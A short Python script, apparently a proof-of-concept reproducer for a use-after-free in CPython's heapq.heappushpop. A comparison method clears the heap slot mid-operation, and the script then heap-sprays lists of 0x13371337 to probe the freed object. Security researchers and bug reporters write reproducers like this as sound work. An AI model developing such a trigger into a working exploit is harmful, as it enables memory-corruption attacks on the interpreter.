import heapq
import sys
import time

class Target:
    def __init__(self):
        self.a = 0x11223344
        
    def __lt__(self, other):
        print('Before clear:', sys.getrefcount(self))
        heap[0] = None
        print('After clear:', sys.getrefcount(self))
        
        # Trigger Quiescent State / Hazard Pointers processing!
        try:
            time.sleep(0.1)
        except Exception as e:
            print("Sleep failed:", e)
            
        global spray
        spray = []
        for i in range(100):
            spray.append([0x13371337]*5)
            
        print('Spray done')
        
        try:
            print(f'self type: {type(self)}')
            print(f'self dict: {self.__dict__}')
        except Exception as e:
            print(f'Error: {e}')
            
        return False

    def __del__(self):
        print('Target deleted!')

heap = [Target()]

print('Calling heappushpop...')
heapq.heappushpop(heap, b"some item")
print('Done')
